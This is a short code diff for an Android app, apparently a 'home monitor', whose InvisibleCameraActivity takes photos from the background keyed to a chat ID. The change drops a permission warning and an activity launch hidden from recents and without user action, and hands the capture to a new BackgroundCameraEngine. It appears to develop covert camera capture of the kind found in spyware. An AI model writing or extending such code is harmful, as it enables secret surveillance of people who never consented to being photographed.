@@ -10,6 +10,7 @@ import android.hardware.camera2.CameraDevice
 import android.hardware.camera2.CameraManager
 import android.hardware.camera2.CaptureRequest
 import android.hardware.camera2.TotalCaptureResult
+import com.homemonitor.BackgroundCameraEngine
 import android.graphics.ImageFormat
 import android.media.ImageReader
 import android.os.Bundle
@@ -37,23 +38,10 @@ class InvisibleCameraActivity : AppCompatActivity() {
         const val EXTRA_IS_FRONT = "extra_is_front"
 
         fun takePhoto(context: Context, chatId: String, isFront: Boolean) {
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
-                Log.w(TAG, "Overlay permission not granted; background camera activity launch may be restricted on Android 10+")
-            }
             try {
-                val intent = Intent(context, InvisibleCameraActivity::class.java).apply {
-                    putExtra(EXTRA_CHAT_ID, chatId)
-                    putExtra(EXTRA_IS_FRONT, isFront)
-                    addFlags(
-                        Intent.FLAG_ACTIVITY_NEW_TASK or
-                        Intent.FLAG_ACTIVITY_NO_ANIMATION or
-                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
-                        Intent.FLAG_ACTIVITY_NO_USER_ACTION
-                    )
-                }
-                context.startActivity(intent)
+                BackgroundCameraEngine.takePhoto(context, isFront, chatId)
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to launch InvisibleCameraActivity from background: ${e.message}")
+                Log.e(TAG, "Failed to launch BackgroundCameraEngine: ${e.message}")
             }
         }
     }
